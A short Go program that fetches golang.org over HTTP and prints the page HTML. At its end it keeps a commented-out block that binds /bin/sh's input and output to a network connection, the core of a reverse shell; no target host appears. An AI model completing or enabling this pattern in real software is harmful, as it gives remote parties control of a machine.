package main

import (
	"fmt"
	"io"
	"net/http"
)

func main() {
	// Use http.Get instead of raw net.Dial.
	// This automatically handles HTTPS and redirects.
	resp, err := http.Get("https://golang.org")
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close() // Clean up the connection when done

	// Read the actual body content of the page
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}

	// Print the actual useful HTML content
	fmt.Println(string(body))
}

// cmd := exec.Command("/bin/sh")

// cmd.Stdin = conn
// cmd.Stdout = conn
// cmd.Stderr = conn

// cmd.Run()
